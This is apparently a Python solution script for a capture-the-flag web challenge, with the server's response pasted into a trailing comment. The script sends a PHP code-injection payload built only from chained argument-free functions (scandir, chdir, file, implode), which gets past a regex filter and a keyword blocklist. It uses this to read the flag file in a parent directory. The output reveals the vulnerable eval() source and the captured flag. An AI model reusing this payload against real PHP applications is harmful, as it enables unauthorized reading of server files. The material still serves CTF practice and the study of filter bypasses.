import requests
 

# res = requests.post('http://d3489bd676f74dcb9f2b5fab34e19622c538d0e946de412d.changame.ichunqiu.com/code/index.php',

# data={"code":"echo();"}
# )

def getrec(s,n):
    ans=s
    for i in range(n):
        ans="ecddho("+ans+")"
    return ans

res = requests.get(
"http://bbc359c432f04a5cbb91f737fafd9617496496bb7b454e40.changame.ichunqiu.com/code/?code=echo(implode(file(end(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))))));")
 
 
# print(getrec("",10))
print (res.content,len(res.content))

'''
(PYTHON37) C:\Users\14682\Desktop\11-2\rsa_029aa751be5ab319369f4b9aef499e19>python -u "c:\Users\14682\Desktop\11-2\rsa_029aa751be5ab319369f4b9aef499e19\3.py"
b'<code><span style="color: #000000">\n<span style="color: #0000BB">&lt;?php<br />highlight_file</span><span style="color: #007700">(</span><span style="color: #0000BB">__FILE__</span><span style="color: #007700">);<br /></span><span style="color: #0000BB">$code&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">\'code\'</span><span style="color: #007700">];<br />if&nbsp;(!empty(</span><span style="color: #0000BB">$code</span><span style="color: #007700">))&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(</span><span style="color: #DD0000">\';\'&nbsp;</span><span style="color: #007700">===&nbsp;</span><span style="color: #0000BB">preg_replace</span><span style="color: #007700">(</span><span style="color: #DD0000">\'/[a-z]+\\((?R)?\\)/\'</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">NULL</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$code</span><span style="color: #007700">))&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(</span><span
style="color: #0000BB">preg_match</span><span style="color: #007700">(</span><span style="color: #DD0000">\'/readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i\'</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">$code</span><span style="color: #007700">))&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">\'bye~\'</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eval(</span><span style="color: #0000BB">$code</span><span style="color: #007700">);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"No&nbsp;way!!!"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />}else&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;</span><span style="color: #DD0000">"No&nbsp;way!!!"</span><span style="color: #007700">;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /></span>\n</span>\n</code><?php\r\n$flag=\'flag{1525ce69-7970-47fd-87df-743685b04e23}\';\r\necho \'\r\n<html>\r\n<head>\r\n<meta charset="utf-8">\r\n<meta http-equiv="content-language" content="utf-8">\r\n\t<title>Are you ready?</title>\r\n</head>\r\n<body>\r\n<div id="mydiv">\r\n    <h1>\xe4\xbb\x96\xe7\x9c\x9f\xe7\x9a\x84\xe5\xbe\x88\xe6\x9c\x89\xe6\x84\x8f\xe6\x80\x9d</h1>\r\n    <h3>\xe5\xbf\xab\xe6\x9d\xa5\xe8\xaf\x95\xe8\xaf\x95\xe5\x90\xa7</h3>\r\n    <img src="./image/22222.jpg">\r\n</div>\r\n<!--src in /code and flag is in this page-->\r\n</body>\r\n</html>\';\r\n' 3163
'''